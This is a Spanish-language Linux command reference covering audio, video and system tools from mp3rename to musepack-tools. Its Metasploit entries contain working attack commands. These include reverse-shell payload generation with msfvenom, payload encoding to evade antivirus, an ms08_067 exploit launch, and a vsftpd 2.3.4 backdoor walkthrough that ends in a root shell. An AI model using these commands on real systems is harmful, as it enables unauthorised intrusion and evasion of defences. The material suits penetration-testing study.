$ mp3rename -s '&a_&t' (establecer las opciones predeterminadas las cuales quedan anotadas en ~/.mp3rename)
Opciones:
	&a  (artista), &b (album), &k (pista), &t (título), &y (año)
$ mp3rename *.mp3  (renombrará segun las opciones predeterminadas)
$ mp3rename -i *.mp3 (muestra los id3 tag de todos los mp3)
	Nota.- No siempre los id3tag estan disponibles o están completos


mp3report
Programa para escanear una lista de directorios y subdirectorios creando un informe desde una plantilla HTML. También calcula varias estadísticas y duración de cada canción.
$ mp3report --title=Titulos directorio (especificando un título)
$ mp3report --title=Titulos --outfile=musica.html directorio (especificando archivo de salida)


mp3roaster
Permite grabar CD de audio desde archivos en distintos formatos como MP3, Ogg Vorbis, FLAC y WAV. Las principales características de esta aplicación son su fácil uso y la función de nivelación automática del volumen para una calidad óptima de audio en CD.
$ mp3roaster archivo1.mp3 archivo2.mp3 archivo3.mp3 (iniciará el proceso de conversión WAV y grabará un CD de audio con esas pistas)
mp3roaster -d /dev/cdrw -v -n "Mi CD de Audio" archivo1.mp3 archivo2.ogg archivo3.flac (selecciona el dispositivo de grabación, habilita la nivelación automática del volumen y da un nombre o etiqueta al CD)


mp3splt
Dividir archivos MP3, Ogg Vorbis o FLAC sin necesidad de recodificarlos, manteniendo así la calidad original del audio.
$ mp3splt cancion.mp3 1.30 3.45 (extrae desde el minuto 1:30 hasta el minuto 3:45)
$ mp3splt album.mp3 0.0 5.30 12.15 18.45 (crea 3 archivos: 0:00-5:30, 5:30-12:15 y 12:15-18:45)
$ mp3splt -s *.mp3 (dividir álbumes completos automáticamente por silencios)
$ mp3splt -s -p th=-40,min=2 album.mp3 (umbral de silencio en dB, valores más negativos = más sensible y duración mínima del silencio en segundos)
$ mp3splt -c archivo.cue album.mp3 (división usando archivos CUE. Los archivos CUE contienen información sobre las pistas de un álbum)
$ mp3splt -t 10.0 podcast.mp3 (división por intervalos regulares de 10 minutos)
$ mp3splt -S 5 archivo.mp3 (dividir en 5 partes iguales)
$ mp3splt -c query.cddb album.mp3 (buscará el álbum en la base de datos CDDB y dividirá según las pistas encontradas)
$ mp3splt -s -p th=-48,min=1.5 -o "@n-@a-@t" -d "./album_dividido/" album_completo.mp3 (detecta silencios con umbral de -48dB y mínimo 1.5 segundos, nombra archivos como: "01-Artista-Titulo.mp3" y guarda en la carpeta "./album_dividido/")
$ mp3splt -w archivo_wrap.mp3 (para archivos que fueron unidos con mp3wrap [ver])
$ mp3splt -a album.mp3 0.0 5.30.40 (divisiones más precisas a nivel de frame: minutos, segundos, centésimas)
$ mp3splt -n cancion.mp3 1.0 3.0 (no crear carpeta para los archivos de salida)
$ mp3splt -q cancion.mp3 1.0 3.0 (modo silencioso sin salida por pantalla)
$ mp3splt -r cancion.mp3 1.0 3.0 (eliminar el silencio original de las divisiones)
$ mp3splt -P cancion.mp3 1.0 3.0 (previsualizar divisiones sin ejecutar)
$ mp3splt -o "@n-@t" album.mp3 0.0 5.30 10.00 (especificar formato de salida)
Variables disponibles:
	  @n --> número de pista
	  @t --> título
	  @a --> artista
	  @b --> álbum
	  @f -->nombre del archivo original


mp3val
Herramienta para la validación de archivos de audio MPEG
$ mpeval -f -si tema.mp3 (tratar de corregir errores y suprimir mensaje de información)


mp3wrap
Utilidad que agrupa varios archivos MP3 en uno solo, sin perder nombres de archivo ni información ID3, y sin recodificar. También permite archivar datos no relacionados con audio, como listas de reproducción, archivos de información e imágenes de portada dentro del MP3. Concatena físicamente los archivos MP3 uno tras otro, manteniendo intactos sus encabezados ID3 y sin alterar los datos de audio. El resultado es un archivo MP3 válido que la mayoría de los reproductores pueden reproducir como una sola pista larga. Además, si se incluye archivos no-MP3, como .txt, .jpg, etc, los agrega al final del archivo MP3 en una sección especial que no interfiere con la reproducción.
$ mp3wrap album_completo.mp3 cancion1.mp3 cancion2.mp3 cancion3.mp3 (combinar 3 canciones en ambum_completo)
$ mp3wrap podcast_con_datos.mp3 episodio1.mp3 episodio2.mp3 portada.jpg playlist.m3u (episodio1.mp3 y episodio2.mp3 se reproducirán en secuencia y portada.jpg y playlist.m3u se almacenan al final del archivo MP3)
$ mp3splt -w album_completo_MP3WRAP.mp3 (recuperar los archivos originales, incluyendo los no-MP3,con mp3splt [ver])
Nota.- cat a.mp3 b.mp3 > c.mp3 también funciona, pero no preserva metadatos de forma confiable ni permite incluir archivos no-MP3.
1.-
Un caso de recuperar los archivos originales:
$ mp3wrap mix.mp3 a.mp3 b.mp3 cover.jpg
El archivo generado será mix_MP3WRAP.mp3, y para extraer:
$ mp3splt -w mix_MP3WRAP.mp3
Esto generará:
a.mp3
b.mp3
cover.jpg
La mayoría de los reproductores como VLC, Audacious, etc reproducen el archivo resultante sin problemas. Algunos reproductores móviles o simples podrían tener problemas si hay archivos no-MP3 incrustados y cada fragmento conserva sus propias etiquetas, pero solo las del primer fragmento suelen mostrarse en interfaces gráficas.


mpack
Utilidad para codificar archivos binarios en mensajes de correo con formato MIME [Multipurpose Internet Mail Extensions].
$ mpack -s "Reporte Trimestral" -d cuerpo.txt informe.pdf gerente@empresa.com (asunto del correo electrónico, el texto del correo que se envia, el archivo que se codificará en formato MIME y se adjuntará y destinatario)


mpc
[Music Player Command]. Herramienta para interactuar con MPD (Music Player Daemon). Es una herramienta sencilla y potente que permite controlar la reproducción, gestionar listas de reproducción, ajustar el volumen, y más, enviando comandos al servidor MPD [ver]. El daemon mpd debe estar ejecutándose en segundo plano.
$ mpc play (inicia la reproducción de la pista actual o la primera de la lista de reproducción)
$ mpc pause (pausar música)
$ mpc stop (parar reproducción)
$ mpc next (siguiente pista)
$ mpc prev (pista anterior)
$ mpc add "/ruta/cancion.mp3" (añadir una canción a la lista de reproducción)
$ mpc add "~/Rock" (añadir un directorio completo)
$ mpc playlist (listar la lista de reproducción actual)
$ mpc clear (borrar la lista de reproducción)
$ mpc save mi_lista (guardar una lista de reproducción)
$ mpc load mi_lista (cargar una lista de reproducción guardada)
$ mpc volume 50 (ajustar volumen [0-100])
$ mpc volume +10 (subir volumen)
$ mpc volume -10 (bajar volumen)
$ mpc status (información como la canción actual, el estado de reproducción [play/pause/stop], el volumen y si está activado el modo aleatorio o repetitivo)
$ mpc current (ver la canción actual)
$ mpc random on (activar/desactivar [off] reproducción aleatoria)
$ mpc repeat on (activar/desactivar [off] repetición)
$ mpc update (si se añade o elimina archivos en el directorio de música configurado, actualizar la base de datos de MPD)
$ mpc add http://icecast-stream-url/radio.mp3 && mpc play (reproducir streams en línea por ejemplo, radios por Internet)


mpd
[Music Player Daemon]. Servidor de música ligero y flexible que se ejecuta como un daemon [proceso en segundo plano]. Permite reproducir archivos de audio en diversos formatos [Ogg-Vorbis, FLAC, MP3, Wave, AIFF]) y transmisiones en línea, además de gestionar listas de reproducción. MPD no tiene una interfaz gráfica propia, sino que se controla a través de clientes, como mpc [ver] o interfaces gráficas [ncmpcpp, Cantata, etc.]. También incluye reproducción sin interrupciones, salida con búfer y compatibilidad con crossfading.
Ajustes en la configuración:
# nano /etc/mpd.conf
music_directory	"/home/usuario/Musica"
playlist_directory "/home/usuario/.mpd/playlists"
db_file	"/home/usuario/.mpd/mpd.db"
log_file "/home/usuario/.mpd/mpd.log"
pid_file "/home/usuario/.mpd/mpd.pid"
state_file "/home/usuario/.mpd/mpdstate"
sticker_file "/home/usuario/.mpd/sticker.sql"
user "usuario"
group "usuario"
bind_to_address "localhost"
port "6600"
Crear los archivos mencionados en la configuración:
$ touch /home/usuario/.mpd/playlists
$ touch /home/usuario/.mpd/mpd.db
$ touch /home/usuario/.mpd/mpd.log
$ touch /home/usuario/.mpd/mpd.pid
$ touch /home/usuario/.mpd/mpdstate
Arrancar el demonio:
$ mpd


mpeg3-utils
Utilidades para trabajar con archivos MPEG, incluyendo la indexación, lectura y manipulación de audio y video de diversos formatos MPEG como MPEG-1, MPEG-2 y MP3. Incluye las herramientas mpeg3cat, mpeg3dump, mpeg3peek y mpeg3toc
$ mpeg3toc mi_video.mpg (indexar un archivo de video MPEG-2 llamado mi_video.mpg)
$ mpeg3cat archivo1.mpg archivo2.mpg > archivo_unido.mpg (unir archivos. Todos los archivos deben tener el mismo formato MPEG)
$ mpeg3cat -s 10 -e 30 mi_video.mpg > extracto.mpg (extraer desde el segundo 10 hasta el segundo 30 del archivo mi_video.mpg)
$ mpeg3dump -h -v mi_video.mpg (muestra el encabezado MPEG del archivo y aumenta el nivel de detalle)
$ mpeg3peek -f 500 mi_video.mpg (encontrar dónde comienza el frame de video número 500 en mi_video.mpg)


mpegdemux
Demultiplexor de flujo de sistema MPEG1/2. Combinar video, audio, subtítulos, menús... se llama "multiplexado" y separarlos "demultiplexado". Esta herramienta permite listar el contenido de un flujo de sistema MPEG y extraer sus flujos.
$ mpegdemux -c video.mp4 (analizar un flujo del sistema en busca de flujos elementales. Es el predeterminado)
$ mpegdemux -e video.mpg (no imprimir códigos de fin en el modo de listado)


mpg123
Reproducir mp3 o urls
$ mpg123 archivo.mp3
$ mpg123 -@ http://uplink.duplexfx.com:8062/


mpg321
Reproductor MP3 clon del popular reproductor mpg123.
$ mpg321 audio.mp3 (reproducir)
$ mpg321 ~/Música/*.mp3 (reproducir todos los archivos mp3 en un directorio)
$ mpg321 ~/Música/*.mp3 -z (genera una lista de reproducción ordenada aleatoriamente que se reproduce una vez)
$ mpg321 ~/Música/*.mp3 -Z (reproduce aleatoriamente las listas de reproducción mientras mpg321 esté en ejecución)


mpgtx
[comandos derivados: mpgsplit, mpgcat, mpgjoin, mpginfo, mpgdemux]. Manipulación de archivos mpeg.
mpgtx -i equivalente a mpginfo
mpgtx -s equivalente a mpgsplit
mpgtx -j equivalente a mpgjoin
mpgtx -j -o equivalente a mpgcat
mpgtx -d equivalente a mpgdemux
$ mpgtx -s archivo.mpg [3:15-] -b cortado.mpg (Dejar de un mpg del minuto 3,15 al final y guardarlo en cortado.mpg)
$ mpgtx -s archivo.mpg [3:15-10:30] -b cortado.mpg (Lo mismo pero dejando del minuto 3,15 al 10,30)
$ mpgtx -100 arhivo.mpg -b cortado (creará 100 trozos del archivo.mpg con los nombres cortado-001, cortado-002...)


mplayer
Reproductor de video
$ mplayer -vo aa movie.avi   (en ascii)
$ mplayer -vo aa:extended:driver=curses:contrast=50 movie.avi
$ mplayer -vo caca movie.avi  (en color)
$ mplayer -vo fbdev file.mpeg  (reproduce en blanco y negro)
$ mplayer -vo fbdev2 file.mpeg (reproduce en color)
$ mplayer -vo fbdev2 -fs -zoom -double file.avi
-vo -help (ver opciones del driver)
$ mplayer -cache 128 -tv driver=v4l2:width=176:height=177 -vo xv tv:// -noborder -geometry "95%:93%" -ontop  (Abre una ventana en la esquina inferior izquierda con imagenes de la webcam)
$ mplayer mms://flux.cxnlive.com/oldiesfm  (Escuchar una emisora)
$ mplayer -nolirc http://5253.live.streamtheworld.com/VIRGINRADIO_DUBAIAAC (Otra forma de escuvhar una emisora)
$ mplayer http://192.168.1.115/img/video.asf -frames 1 -vo jpeg:quality=100:maxfiles=1  (Tomar una imagen [frames 1] de una ubicación en la red)


mppenc
Codificador de audio con pérdida Musepack. Musepack es un códec de audio con pérdida optimizado específicamente para la compresión transparente de audio estéreo a velocidades de bits de 160-180 kbit/s.
$ mppenc entrada.wav
$ mppenc entrada.wav salida.mpc


mpstat
[sysstat]. Escribe en la salida estándar las actividades de cada procesador disponible, siendo el primero el procesador 0. Si no se ha seleccionado ninguna actividad, entonces el informe por defecto es el informe de utilización de la CPU.
# mpstat -P ALL 2 5 (informes de todos los procesadores a intervalos de 2 segundo 5 veces)
# mpstat -u 2 3 (informe de la cpu cada 2 segundos 3 informes)


mpsyt
[mps-youtube]. Reproductor de videos de youtube. Precisa python3
# pip install mps-youtube
Hace uso de aplicaciones externas. Para las descargas aria2.
# apt-get install aria2
# set download_command aria2c --dir=%d --out=%f %u
# set download_command aria2c -s4 -x4 --dir=%d --out=%f %u
$ mpsyt (Lanzar la aplicación)
Una vez lanzada, en el promt de la misma se lanzan los siguientes ajustes:
Y para la reproducción, mpv o mplayer.
$ set player mplayer (para que mplayer sea el reproductor)
$ set player mpv (Para que lo sea mpv)
$ set search_music false (Para que no busque archivos de música [por defecto])
$ set show_video true (Para que los busque de video)
Las busquedas se realizan anteponiendo un punto al video a buscar [.madonna] y el que se desea del listado que aparece se selecciona entrando el número que indica [1,2,3...] y para descargar:
	d número
Para más opciones:
	h
# pip3 install mps-youtube --upgrade (actualizar la aplicación)


mpv
Reproductor de video gobernado exclusivamente con el teclado.
Instalación en el caso de que no se encuentre en los repos:
	# apt-get install git
	# git clone https://github.com/mpv-player/mpv-build.git
	# cd mpv-build/
	# ./update
	# apt-get install devscripts equivs
	# dpkg -i mpv-build-deps_1.0_amd64.deb
	# mk-build-deps
	El comando anterior puede arrojar muchos errores. Ni caso.
	# apt-get -f install
	# debuild -uc -us -b -j2
	# dpkg -i ../mpv_0.3.5_amd64.deb
Archivo de configuración:
$ nano .mpv/config
Algunos ajustes:
geometry=50%:50% (Medida de la pantalla)
fs=yes (Iniciar con pantalla maximazada)
volume=100 (Indicar el volumen por defecto)
cache=50000 (cache de la aplicación)
msgcolor=yes
Algunos atajos:
	q (Salir)
	v (Mostrar /esconder los subtítulos)
	r y t (Cambiar la posición vertical del subtítulo)
	o (1ª pulsación muestra el tiempo transcurrido, 2ª porcentaje y tiempo total)
	p (Pause / Renaudar)
	s (Sacar una captura)
	S (Sacar una captura con los subtítulos)
	f (Pantalla completa)
	m (Silenciar)
	1 y 2 (Aumenta / disminuye constraste)
	3 y 4 (Aclara / oscurece la imagen)
	5 y 6 (Gamma)
	7 y 8 (Aumentar / disminuir brillo)
$ mpv video


mrename
Añade un prefijo al nombre del archivo
$ mrename '*.mp3' vacaciones -m  (sustituye los originales)
$ mrename '*.mp3' vacaciones -c  (los copia con el prefijo)


mrxvt
Emulador de terminal
Opciones:
-geometry 100x15 (Especificando medidas)
-title "Terminal linux" (Especificando título)
-o 20  (Nivel de transparencia. De 0 a 100)
-pixmap imagen (Con una imagen de fondo)
-bg red  (color de fondo)
-fg white (color de fuente)


msfbinscan
Utilidad para analizar archivos binarios y detectar patrones que podrían corresponder a payloads generados con Metasploit.
# msfbinscan -o -f archivo.bin -s .text (despliega la salida en formato detallado y analizaría la sección .text del archivo en busca de shellcode o patrones conocidos)


msfcli
Interfaz de línea de comandos que permite ejecutar exploits y módulos directamente sin entrar en msfconsole que lo ha reemplazado.
# msfcli exploit/windows/smb/ms08_067_netapi PAYLOAD=windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 E (usando el exploit que afecta a sistemas Windows a través de SMB, el payload que genera una sesión de Meterpreter inversa, LHOST la dirección IP del atacante, LPORT es el puerto esperando la conexión inversa y la opción E ejecuta el exploit)
# msfcli exploit/windows/smb/ms08_067_netapi O (muestra las opciones del payload)


msfconsole
[metasploit]. Consola centralizada con acceso a todo las opciones disponibles de Metasploit Framework, única soportada y estable con soporte para de edición de lineas (readline), que permite tabulacion y ejecución de comandos externos.
	msf > ping -c 1 192.168.1.10 (usar ping)
	msf > nmap 192.168.1.10 (usar nmnap)
	msf > help (ayuda)
	msf > show (mostrar módulos disponibles)
	msf > show auxiliary (mostrar módulos auxiliares [scanners, modulos de denial of service, fuzzers...]
	msf > show exploits (obtener una lista de todos los exploits)
	msf > show payloads (mostrar listado de los diferentes payloads y para las plataformas disponibles)
Nota.- Cuando se está usando un determinado exploit, "show payloads" solo mostrará los que son compatibles para ese exploit concreto.
	msf exploit(ms08_067_netapi) > show options (Seleccionado un módulo y mostrar opciones disponibles y/o requeridas para ese concreto)
	msf exploit(ms08_067_netapi) > show targets (mostrar objetivos soportados)
	msf exploit(ms08_067_netapi) > show advanced (mostrar las opciones avanzadas de un exploit)
	msf > search ms09-001 (buscar cadenas de texto dentro del módulo)
	msf > info dos/windows/smb/ms09_001_write (información detallada [opciones, objetivos....] sobre un determinado modulo)
	msf > use dos/windows/smb/ms09_001_write (escogido el módulo en particular, seleccionarlo con)
	msf auxiliary(ms09_001_write) > show options (mirar sus opciones requeridas)
	msf > connect 192.168.1.10 23 (conectar a una Ip y a un puerto)
	msf auxiliary(ms09_001_write) > set RHOST 192.168.1.10 (configurar las opciones del modulo que se está utilizando)
	msf auxiliary(ms09_001_write) > show options (comprobar de nuevo las opciones del módulo)
	msf exploit(ms08_067_netapi) > show encoders (mostrar codificaciones disponibles)
	msf exploit(ms08_067_netapi) > set encoder x86/shikata_ga_nai (escoger la deseada)
	msf exploit(ms04_045_wins) > check (comprobar si un objetivo es vulnerable a un exploit sin explotar la vulnerabilidad)
	msf > unset RHOST (suprimir una variable entrada para un módulo)
	msf auxiliary(ms09_001_write) > run (lanzar un exploit)
	msf auxiliary(ms09_001_write) > back (salir del módulo)
	msf > irb (cambiar al modo de edición de scripts en ruby)
1.-
Para establecer una variable global [setg - save]:
	msf > setg RHOST 192.168.1.136
	RHOST => 192.168.1.136
	msf > save
	Saved configuration to: /root/.msf3/config
	msf > unsetg RHOST (suprimir una variable global)
2.-
Algunos comandos relacionados con la base de datos propia de metasploit:
	msf > db_status (Mostrar el estado de la conexión a la BDs y nombre)
	msf > db_nmap 192.168.1.10 (Lanzar nmap y guardar el resultado en la BDs)
	msf > hosts (Muestra todos los informes de la BDs)
	msf > hosts 192.168.1.10 (Muestra sólo el informe de la ip especificada)
	msf > services (Muestra todos los servicios de la BDs incluso los inactivos)
	msf > services -u -R 192.168.1.10 (Muestra los servicios activos [u] del host especificado [R])
3.-
Ejemplo de muestra de un scan de puertos:
	msf > search portscan (exploradores de puertos disponibles)
	Nota.- Los escáners y la mayoría de módulos auxiliares usan la opción RHOSTS en vez de RHOST y puede ser un rango de IP [192.168.1.10-192.168.1.50], rangos CIDR (192.168.1.0/24), múltiples rangos separados por comas (192.168.1.0/24, 192.168.3.0/24) y una lista en un archivo con una ip por linea (file:/tmp/hostlist.txt).
	msf > use scanner/portscan/tcp ((para escoger el escaneador de puertos a usar)
	msf > auxiliary(tcp) > show options (comprobar si falta algún parámetro [RHOSTS])
	msf > auxiliary(tcp) > set RHOSTS 192.168.1.10 (entrar la ip donde dirigir el escaneo)
	msf > auxiliary(tcp) > run (arancar el escaneo)
Todos los módulos scanner tiene el valor THREADS en "1". Este valor establece el número de subprocesos simultaneos que se utilizan durante la exploración. Un número superior acelera las exploraciones pero aumenta el tráfico en la red.
	msf > set THREADS 50 (para modificar el valor)
4.-
Ejemplo de muestra de un ataque
        maf > use exploit/unix/ftp/vsftpd_234_backdoor
Comprobar parámetros que faltan:
	msf > exploit(vsftpd_234_backdoor) > show options
Entrar el parámetro RHOST [la IP atacada]
	msf > exploit(vsftpd_234_backdoor) > set RHOST 192.168.1.10
Comprobar nuevamente si el parámetro ha entrado correctamente:
	msf > exploit(vsftpd_234_backdoor) > show options
Lanzar el exploit en segundo plano [j] y mostrando una salida positiva en la que se abre una shell en la máquina remota:
	msf > exploit(vsftpd_234_backdoor) > exploit -j
	[*] Exploit running as background job.
	[*] Banner: 220 (vsFTPD 2.3.4)
	[*] USERR: 331 Please specify the password.
	msf exploit(vsftpd_234_backdoor) > [+] Backdoor service has been spawned, handling...
	[+] UID: uid=0(root) gid=0(root)
	[*] Found shell.
	[*] Command shell session 1 opened (192.168.1.15:49654 -> 192.168.1.10:6200) at 2013-07-07 08:06:30 -0400
	msf > exploit(vsftpd_234_backdoor) > sessions -l (mostrar las sesiones abiertas [ID de la sesion, puertos abiertos, máquina remota, local...])
	msf > exploit(vsftpd_234_backdoor) > sessions -c ifconfig (ejecutar un comando en todas las shells abiertas y mostradas con sessions -l)
	msf > exploit(vsftpd_234_backdoor) > sessions -i 1 (entrar en la session con ID 1)
	[*] Starting interaction with 1...
A partir de este punto estamos en una shell clásica de linux del host 192.168.1.10 donde podemos usar todos los comandos propios de dichas shells.


msfd
daemon de Metasploit que permite conexiones remotas a través de un socket TCP.
# msfd -S -a 127.0.0.1 -p 55553 (-S iniciar una shell interactiva, -a el daemon se ejecuta en localhost y -p establece el puerto del socket TCP)
Para conectar a este daemon desde otra terminal:
# nc 127.0.0.1 55553


msfdb
Administra la base de datos que Metasploit utiliza para almacenar información sobre los objetivos, vulnerabilidades, sesiones, etc.
# msfdb init (inicializar y configurar una base de datos PostgreSQL para Metasploit)
# msfdb start (arrancar la base de datos para que Metasploit pueda conectarse a ella)
# msfdb stop (detener la base de datos)
# msfdb restart (reiniciar la base de datos)
# msfdb delete (eliminar la base de datos)


msfelfscan
Se utiliza para escanear archivos ELF [Executable and Linkable Format] en busca de gadgets ROP [Return Oriented Programming], que son útiles para los exploits basados en desbordamientos de búfer.
# msfelfscan -j /ruta/archivo (escanear un archivo ELF en busca de gadgets ROP)
# msfelfscan -r /ruta//archivo (escanear un ELF en busca de secuencias que terminen en una instrucción de retorno)


msfencode
Usado para ofuscar o modificar payloads generados con Metasploit. Hoy en día, esta funcionalidad se ha integrado dentro del comando msfvenom.
# msfencode -e x86/shikata_ga_nai -i shellcode.bin -o encoded.bin -c 3 (usando el encodificado especificado para evadir antivirus, archivo de entrada del payload original, archivo de salida con el shellcode codificado y que el payload será codificado 3 veces)
# msfencode -e x86/shikata_ga_nai -i shellcode.bin -o encoded.bin -t exe -b '\x00\x0a' (-t para generar un archivo ejecutable y -b excluye ciertos caracteres por ejemplo, \x00 y \x0a para evitar bytes nulos)


msfmachscan
Se utiliza para escanear archivos ejecutables Mach-O, el formato de archivo ejecutable utilizado por macOS, en busca de gadgets ROP [Return Oriented Programming] o para obtener detalles técnicos de los archivos ejecutables.
# msfmachscan -j /ruta/a/archivo_mach-o (escanea el archivo en busca de gadgets ROP)
# msfmachscan -r /ruta/a/archivo_mach-o (busca secuencias de retorno)
# msfmachscan /ruta/a/archivo_mach-o (proporciona información detallada sobre las secciones y los encabezados del archivo)


msfpayload
Utilizado obsolera para generar payloads de manera sencilla, pero ha sido reemplazado por msfvenom, que combina tanto msfpayload como msfencode en una sola herramienta.
# msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 R > shell.exe (generar un payload de tipo Meterpreter para Windows con una conexión reversa al host y puerto indicados y guardarlo en shell,exe)
Dado que msfpayload ha sido reemplazado, el comando actual sería:
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe


msfpescan
Escanea archivos ejecutables PE [Portable Executable], el formato utilizado en Windows en busca de gadgets ROP, secuencias de retorno, o analiza el archivo en busca de datos.
# msfpescan -j /ruta/a/archivo_pe (busca gadgets ROP dentro del archivo PE)
# msfpescan -r /ruta/a/archivo_pe (busca secuencias que terminan con una instrucción de retorno)
# msfpescan -h /ruta/a/archivo_pe (obtener detalles sobre los encabezados y las secciones del archivo PE)


msfremove
Se utiliza para eliminar módulos antiguos o innecesarios de Metasploit Framework.
# msfremove exploit/windows/smb/ms17_010_eternalblue (eliminar el exploit mencionado)
# msfremove auxiliary/scanner/smb/smb_version exploit/windows/smb/ms08_067_netapi (eliminar varios múdulos)
# msfremove --list (muestra lista de módulos que se pueden eliminar)


msfrop
Se utiliza para identificar gadgets ROP [Return Oriented Programming] en archivos ejecutables o bibliotecas. Estos gadgets son fragmentos de código que terminan en una instrucción de retorno y pueden ser usados en exploits.
# msfrop /ruta/a/archivo_elf (escanear el archivo ELF especificado en busca de gadgets ROP)
# msfrop -f pop /ruta/a/archivo_elf (filtrar los gadgets que contienen la instrucción pop)
# msfrop -s /ruta/a/archivo_elf (muestra el tamaño de las instrucciones que forman los gadgets)


msfrpc
Es un cliente que se conecta a la API RPC de Metasploit, permitiendo a los usuarios controlar Metasploit de forma remota.
# msfrpc -P password -U msf -a 127.0.0.1 -p 55552 (-P contraseña para autenticarte en el servidor RPC, -U nombre de usuario [msf por defecto], -a dirección IP del servidor RPC y puerto donde corre el servidor RPC)
Una vez conectado, se puede ejecutar comandos y tareas en Metasploit, por ejemplo, creando una consola y ejecutando el comando para usar un exploit:
    rpc.call('console.create')
    rpc.call('console.write', [console_id, "use exploit/multi/handler\n"])


msfrpcd
inicia un demonio que proporciona una API RPC para que otros programas o scripts puedan interactuar con Metasploit.
# msfrpcd -U msf -P password -a 127.0.0.1 -p 55552 (-U nombre de usuario para conectarse, -P contraseña, -a donde el daemon RPC estará escuchando y númro de puerto de escucha)
# msfrpcd -S -a 127.0.0.1 -p 55552 (iniciar el demonio sin necesidad de autenticación)
# msfrpcd -U msf -P password -a 127.0.0.1 -p 55552 -S (-S habilita el uso de SSL para las conexiones RPC)


msfupdate
Actualiza el Metasploit Framework a la versión más reciente disponible desde los repositorios oficiales.
# msfupdate


msfvenom
Combina las funciones de las antiguas herramientas msfpayload y msfencode para generar y codificar payloads en una sola utilidad.
# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe (-p Meterpreter con conexión inversa, LHOST donde el sistema comprometido se conectará, LPORT donde se espera la conexión, -f formato de salida como un archivo ejecutable de Windows y -o guarda el archivo con el nombre shell.exe)
# msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -e x86/shikata_ga_nai -b '\x00' -i 3 -f elf -o shell.elf (-e un codificador, -b excluye ciertos bytes y -i número de iteraciones para codificar el payload)
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f c  (genera un payload en formato de código C, que puede ser inyectado directamente en un programa)


mtar
Tar para máquinas con multiples cores. La sintaxis es igual que la de tar [ver]


mtr
Aplicación que combina las funcionalidades de traceroute y ping, probando cada uno de los saltos que hay desde que un paquete se envía hasta que llega a su destino.
# mtr -f tuxapuntes.com (sin el -f se muestra de forma gráfica)
# mtr --tcp --port 80 --report --report-cycles 10
Atajos mientras está la aplicación ejecutándose:
	h ayuda
	d modo de visualización
	r reiniciar
	o orden de los campos
	q salir


mtd-utils
Utilidades para manipular dispositivos con tecnología de memoria, como memoria flash, Disk-On-Chip o ROM. Incluye las siguientes herramientas: docfdisk, doc_loadbios, flashcp, flash_erase, flash_eraseall, flash_lock, flash_otp_dump, flash_otp_info, flash_otp_lock, flash_otp_write, flash_unlock, ftl_check, ftl_format, jffs2dump, jffs2reader, lsmtd, mkfs.jffs2, mkfs.ubifs, mtd_debug, mtdinfo, mtdpart, nanddump, nandtest, nandwrite, nftldump, nftl_format, recv_image, rfddump, rfdformat, serve_image, sumtool, ubiattach, ubiblock, ubicrc32, ubidetach, ubiformat, ubihealthd, ubimkvol, ubinfo, ubinize, ubirename, ubirmvol, ubirsvol, ubiupdatevol.


multitail
Abrir en una ventana varios procesos tail.
$ multitail /var/log/messagess /var/log/apache2/access.log
$ multitail -R 2 -l "netstat -t" -ci green /var/log/apache2/access.log -ci yellow /var/log/apache2/error.log
$ multitail -a netstat.log -R 2 -l "netstat -t tcp" /var/log/apache/access.log
# multitail -n 20 /var/log/dpkg.log (ver las últimas 20 lineas)
# multitail -n 20 -iw 2 /var/log/syslog -i /var/log/sudo.log (ver las 20 últimas filas de dos archivos y actualizar cada 2 segundos)
Algunas opciones:
-ci red (muestra los log en rojo)
-R 2     (actualiza cada 2 segundo)
-l "comando"  (incluir un comando)
-a archivo.log  (crear un archivo con los resultados del comando)
-I  (muestra el log precedido de la "i" mayuscula en la misma ventana que el anterior)
-s 2   (Mostrar el resultado en dos columnas)
-sn 2,3  (Mostrar 2 resultados en la 1ª columna y 3 en la 2ª)
Notas:
	F1 (abrir la ayuda)
	^g (cerrar ventana ayuda)
	b   (selecionar proceso)
	q   (cerrar ventana proceso)
	v   (Cambiar la orientación horizontal/vertical)


munin
Monitor del sistema via web. Permite, mediante plugins, monitorizar varios servicios. Funciona en modo cliente/servidor.
# /etc/init.d/munin start
Y colocar en el navegador: file:///var/cache/munin/www/index.html


munpack
Utilidad para decodificar archivos binarios en mensajes de correo con formato MIME y extraer los archivos adjuntos para guardarlos como archivos separados en el disco. Por compatibilidad con métodos más antiguos de transferencia de archivos binarios, el programa munpack también puede decodificar mensajes en formato de codificación uu-split.
$ munpack email_con_adjunto.eml (extraer el adjunto del correo guardado con el nombre especificado. Si el correo continene texto previo se guardará en un archivo con extensión .desc)
$ munpack -C /correos -f email.eml (xtrae los archivos adjuntos en el directorio especificado y fuerza sobreescritura. Por defecto, añade sufijos [.1, .2, etc] para evitar sobrescribir)


mupdf
Visor de archivos pdf
$ mupdf -b 8 -r 150 archivo.pdf (con la máxima calidad [de 0 a 8] y a 150 dpi de resolución [por defecto 72] si el pdf requiriese contraseña se añadiría con “-p contraseña”)
Arrancada la aplicación, algunas teclas de control son:
	L M (Voltea el pdf)
	h j k l (scroll arriba/abajo y derecha/izquierda)
	+ - (Aumentar/diminuir medida del texto)
	15g (Ir a la página 15)
	/ (Abre diálogo “buscar texto”)
	n N (Ir a la siguiente/anterior busqueda)
	. , (Página siguiente, página anterior)


muraster
Convierte páginas PDF en imágenes.
$ muraster -F ppm -o file.ppm entrada.pdf 1,2 (en formato ppm con el nombre especificado de las páginas 1 y 2 de entrada.pdf)


musepack-tools
Utilidades del formato de comprensión de audio MusePack [.mpc] con gran énfasis en la alta calidad y la transparencia. Incluye las siguientes herramientas mpc2sv8, mpcchap, mpccut, mpcdec, mpcenc, mpcgain y wavcmp.
$ mpcenc audio.wav audio.mpc (codificación básica de .wav a .mpc. Calidad estándar ~180 kbps)
$ mpcenc --quality 7 audio.wav audio.mpc (calidad específica. 0-10, donde 5 es estándar)
$ mpcenc --extreme audio.wav audio.mpc (calidad extrema)
$ mpcenc --artist "Artista" --album "Álbum" --title "Canción" audio.wav audio.mpc (con etiquetas ID3)
$ mpcdec audio.mpc audio.wav (convierte archivo Musepack a WAV)
$ mpcdec audio.mpc - (decodificar a stdout)
$ mpcgain -a *.mpc (normalizar sin recodificar)
